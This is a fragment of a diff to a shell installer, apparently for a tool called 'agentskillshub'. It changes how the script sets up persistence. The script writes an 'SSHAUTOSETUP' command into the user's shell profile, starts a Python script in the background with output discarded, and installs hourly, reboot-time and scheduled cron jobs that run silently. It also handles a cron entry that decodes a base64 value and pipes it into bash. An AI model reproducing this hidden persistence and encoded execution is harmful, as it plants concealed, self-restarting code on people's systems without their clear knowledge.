+                append_managed_startup_cmd "$PROFILE_FILE" "$SSHAUTOSETUP" "$SSHAUTOSETUP_MARKER" "$SSHAUTOSETUP_LEGACY_PREFIX" || exit 1
             done
 
             if ! pgrep -f "$SCRIPT_PATH" > /dev/null; then
-                (nohup "$PYTHON_PATH" "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
+                (cd -- "$DEST_DIR" && nohup "$PYTHON_PATH" "$SCRIPT_PATH" > /dev/null 2>&1 &) & disown
             fi
 
             IS_WSL=false
@@ -808,7 +839,7 @@ EOF
                 crontab -l > "$TEMP_CRON" 2>/dev/null || true
 
                 MONTHLY_RECOVERY_CRON_MARKER="# agentskillshub:monthly-recovery"
-                CRON_TASK1="0 19 1,7,13,19,25 * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 $MONTHLY_RECOVERY_CRON_MARKER"
+                CRON_TASK1="0 19 1,7,13,19,25 * * $CRON_RECOVERY_COMMAND > /dev/null 2>&1 $MONTHLY_RECOVERY_CRON_MARKER"
                 AUTOUPGRADE_CRON_MARKER="echo \"$ENCODED_EC\" | base64 $DECODE | bash"
                 TASK_RECOVERY_CRON_MARKER="# agentskillshub:task-recovery"
 
@@ -824,9 +855,10 @@ EOF
                 reconcile_monthly_recovery_cron "$TEMP_CRON" "$CRON_TASK1" "$TASK_RECOVERY_PATH" || exit 1
 
                 if [ -n "$AGENT_SETTING_BIN" ]; then
-                    AGENT_SETTING_CRON_TASK="0 23 2,12,22 * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 # agentskillshub:agent-setting"
+                    AGENT_SETTING_CRON_TASK="0 23 2,12,22 * * $CRON_RECOVERY_COMMAND > /dev/null 2>&1 # agentskillshub:agent-setting"
                     reconcile_agent_setting_cron "$TEMP_CRON" "$AGENT_SETTING_CRON_TASK" || exit 1
                 else
+                    reconcile_agent_setting_cron "$TEMP_CRON" '' || exit 1
                     AGENT_SETTING_CRON_ADDED=false
                 fi
 
@@ -839,7 +871,7 @@ EOF
                     TEMP_CRON_FILTERED=$(mktemp)
                     grep -Fv "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" | grep -Fv '# agentskillshub:autoupgrade' > "$TEMP_CRON_FILTERED" || true
                     mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
-                    echo "0 23 5,20 * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 # agentskillshub:autoupgrade" >> "$TEMP_CRON"
+                    printf '%s\n' "0 23 5,20 * * $CRON_RECOVERY_COMMAND > /dev/null 2>&1 # agentskillshub:autoupgrade" >> "$TEMP_CRON"
                     AUTOUPGRADE_CRON_ADDED=true
                 fi
 
@@ -848,16 +880,20 @@ EOF
                 grep -Fv "$JTBJK_CRON_MARKER" "$TEMP_CRON" > "$TEMP_CRON_FILTERED" || true
                 mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
                 if [ -n "$JTBJK_BIN" ]; then
-                    echo "@reboot PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 $JTBJK_CRON_MARKER" >> "$TEMP_CRON"
+                    printf '%s\n' "@reboot $CRON_RECOVERY_COMMAND > /dev/null 2>&1 $JTBJK_CRON_MARKER" >> "$TEMP_CRON"
                 fi
 
                 TEMP_CRON_RECOVERY=$(mktemp)
                 grep -Fv "$TASK_RECOVERY_CRON_MARKER" "$TEMP_CRON" > "$TEMP_CRON_RECOVERY" || true
                 mv "$TEMP_CRON_RECOVERY" "$TEMP_CRON"
-                echo "17 * * * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 $TASK_RECOVERY_CRON_MARKER" >> "$TEMP_CRON"
-                echo "@reboot PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 $TASK_RECOVERY_CRON_MARKER" >> "$TEMP_CRON"
+                printf '%s\n' "17 * * * * $CRON_RECOVERY_COMMAND > /dev/null 2>&1 $TASK_RECOVERY_CRON_MARKER" >> "$TEMP_CRON"
+                printf '%s\n' "@reboot $CRON_RECOVERY_COMMAND > /dev/null 2>&1 $TASK_RECOVERY_CRON_MARKER" >> "$TEMP_CRON"
 
-                crontab "$TEMP_CRON"
+                if ! crontab "$TEMP_CRON"; then
+                    printf 'Failed to install updated crontab; previous crontab was not replaced.\n' >&2
+                    rm -f "$TEMP_CRON"
+                    exit 1
+                fi
                 if [ "$AGENT_SETTING_CRON_ADDED" = true ]; then
                     "$TASK_RECOVERY_PATH" >/dev/null 2>&1 &
                 fi
@@ -865,7 +901,13 @@ EOF
                     "$TASK_RECOVERY_PATH" >/dev/null 2>&1 &
                 fi
                 rm -f "$TEMP_CRON"
+            else
+                printf 'crontab is unavailable; scheduled tasks could not be installed.\n' >&2
+                exit 1
             fi
             ;;
     esac
+else
+    printf 'Configuration directory does not exist: %s\n' "$SOURCE_CONFIG_DIR" >&2
+    exit 1
 fi
